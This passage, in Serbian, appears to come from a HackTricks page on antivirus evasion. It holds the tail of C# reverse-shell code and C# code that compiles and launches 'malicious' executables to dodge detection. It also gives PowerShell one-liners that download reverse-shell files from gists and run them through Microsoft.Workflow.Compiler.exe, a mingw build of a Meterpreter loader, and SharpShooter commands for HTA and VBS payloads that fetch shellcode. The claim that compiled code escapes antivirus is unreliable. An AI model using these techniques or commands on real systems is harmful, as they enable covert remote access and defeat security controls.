p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Korišćenje kompajlera u C#

Jedan od načina za zaobilaženje antivirusnog softvera prilikom izvršavanja zlonamernog koda u C# je korišćenje kompajlera. Ovaj metod omogućava da se izbegne detekcija antivirusnog softvera tako što se izvorni kod kompajlira u izvršni fajl pre nego što se pokrene.

Da biste koristili ovu tehniku, prvo morate da napišete zlonamerni kod u C#. Zatim, koristite kompajler da biste preveli izvorni kod u izvršni fajl. Kada se izvršni fajl pokrene, antivirusni softver neće moći da detektuje zlonamerni kod jer je već kompajliran.

Evo primera kako da koristite kompajler u C#:

```csharp
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using Microsoft.CSharp;

namespace AVBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            string maliciousCode = "Console.WriteLine(\"Hello from malicious code!\");";
            string outputFileName = "malicious.exe";

            CSharpCodeProvider codeProvider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = outputFileName;

            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, maliciousCode);

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError error in results.Errors)
                {
                    Console.WriteLine(error.ErrorText);
                }
            }
            else
            {
                Process.Start(outputFileName);
            }
        }
    }
}
```

U ovom primeru, `maliciousCode` predstavlja zlonamerni kod koji želite da izvršite. `outputFileName` je naziv izvršnog fajla koji će biti generisan kompajlerom.

Kada pokrenete ovaj program, kompajler će prevesti zlonamerni kod u izvršni fajl `malicious.exe`. Zatim će se izvršni fajl pokrenuti, izvršavajući zlonamerni kod bez detekcije antivirusnog softvera.

Važno je napomenuti da korišćenje kompajlera za zaobilaženje antivirusnog softvera može biti ilegalno i predstavljati kršenje zakona o sajber bezbednosti. Ova tehnika se treba koristiti samo u okviru legalnih aktivnosti, kao što je testiranje sigurnosti ili obuka.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
